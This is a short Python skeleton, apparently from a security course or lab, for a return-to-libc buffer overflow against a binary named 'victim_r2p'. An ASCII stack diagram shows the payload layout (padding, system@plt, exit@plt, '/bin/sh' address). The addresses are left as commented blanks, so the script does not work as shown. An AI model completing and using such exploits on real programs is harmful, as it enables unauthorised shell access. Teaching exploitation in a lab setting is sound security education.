'''
Smaller    +  +-----------------+
Address    |  |                 |
           |  |     'A's        |
           |  |                 |
           |  +-----------------+
           |  |                 |
           |  |   system@plt    |
           |  |                 |
           |  +-----------------+
           |  |                 |
           |  |    exit@plt     |
           |  |                 |
           |  +-----------------+
           |  |                 |
           |  |   "/bin/sh"     |
 Bigger    |  |   address       |
 Address   v  +-----------------+

'''

from struct import pack
from subprocess import call

a_size = 1984
# system = ?
# exit = ?
# binsh = ?
# pointer_fmt = ?

buf = 'A' * a_size
# buf += pack(pointer_fmt, system)
# buf += pack(pointer_fmt, exit)
# buf += pack(pointer_fmt, binsh)

call(["./victim_r2p", buf])
